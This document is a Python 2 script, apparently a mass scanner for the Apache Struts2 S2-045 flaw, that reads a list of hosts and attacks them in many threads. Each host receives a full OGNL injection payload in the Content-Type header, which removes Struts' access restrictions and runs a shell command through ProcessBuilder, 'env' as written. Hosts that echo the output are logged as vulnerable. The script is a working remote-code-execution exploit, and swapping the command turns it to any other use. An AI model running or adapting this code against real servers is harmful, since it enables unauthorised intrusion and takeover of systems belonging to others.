#! /usr/bin/env python
# encoding:utf-8

import argparse
import sys
import time
import requests
import threading
import Queue
from lib.consle_width import get_terminal_size


lock = threading.Lock()
scan_count = 0
terminal_width = get_terminal_size()[0]
requests.packages.urllib3.disable_warnings()


def print_msg(msg, line_feed=False):
    if len(msg) > terminal_width - 1:
        msg = msg[:terminal_width - 4] + '...'
    sys.stdout.write('\r' + msg + (terminal_width - len(msg) - 1) * ' ')
    if line_feed:
        sys.stdout.write('\n')
    sys.stdout.flush()


def poc():
    global scan_count
    while True:
        try:
            host = queue.get(timeout=0.1)
        except:
            break
        try:
            if not host.lower().startswith('http'):
                host = 'http://%s' % host
            lock.acquire()
            scan_count += 1
            print_msg('[%s scanned/%s left] Scanning %s ' % (scan_count, queue.qsize(), host))

            lock.release()
            headers = {}
            headers['User-Agent'] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) " \
                                   "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
            cmd = 'env'
            headers['Content-Type'] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." \
                                     "(#_memberAccess?(#_memberAccess=#dm):" \
                                     "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." \
                                     "(#ognlUtil=#container.getInstance" \
                                     "(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." \
                                     "(#ognlUtil.getExcludedPackageNames().clear())." \
                                     "(#ognlUtil.getExcludedClasses().clear())." \
                                     "(#context.setMemberAccess(#dm))))." \
                                     "(#cmd='" + \
                                     cmd + \
                                     "')." \
                                     "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase()." \
                                     "contains('win')))." \
                                     "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))." \
                                     "(#p=new java.lang.ProcessBuilder(#cmds))." \
                                     "(#p.redirectErrorStream(true)).(#process=#p.start())." \
                                     "(#ros=(@org.apache.struts2.ServletActionContext@getResponse()." \
                                     "getOutputStream()))." \
                                     "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))." \
                                     "(#ros.flush())}"
            data = '--40a1f31a0ec74efaa46d53e9f4311353\r\n' \
                   'Content-Disposition: form-data; name="image1"\r\n' \
                   'Content-Type: text/plain; charset=utf-8\r\n\r\ntest\r\n--40a1f31a0ec74efaa46d53e9f4311353--\r\n'
            resp = requests.post(host, data, verify=False, headers=headers, timeout=(4, 20))

            if resp.text.find('HOSTNAME=') >= 0:
                lock.acquire()
                _time = time.strftime('%H:%M:%S', time.localtime())
                print_msg('[%s] %s' % (_time, host), True)
                with open('vul_hosts.txt', 'a') as outFile:
                    outFile.write(host + '\n')
                lock.release()
        except Exception, e:
            pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter,
                                     description='Struts2-045 Scanner. By LiJieJie (http://www.lijiejie.com)',
                                     usage='scan.py [options]')
    parser.add_argument('-f', metavar='File', type=str, default='hosts.txt',
                        help='New line delimited targets from File')
    parser.add_argument('-t', metavar='THREADS', type=int, default=100,
                        help='Num of scan threads, 100 by default')

    if len(sys.argv) == 1:
        sys.argv.append('-h')

    args = parser.parse_args()

    queue = Queue.Queue()
    for host in open(args.f).xreadlines():
        host = host.strip()
        if not host:
            continue
        for _host in host.split():
            queue.put(_host.strip().strip(','))
    start_time = time.time()
    threads = []
    for i in range(args.t):
        t = threading.Thread(target=poc)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()
    print_msg('[+] Done. %s hosts scanned in %.1f seconds.' % (scan_count, time.time() - start_time), True)
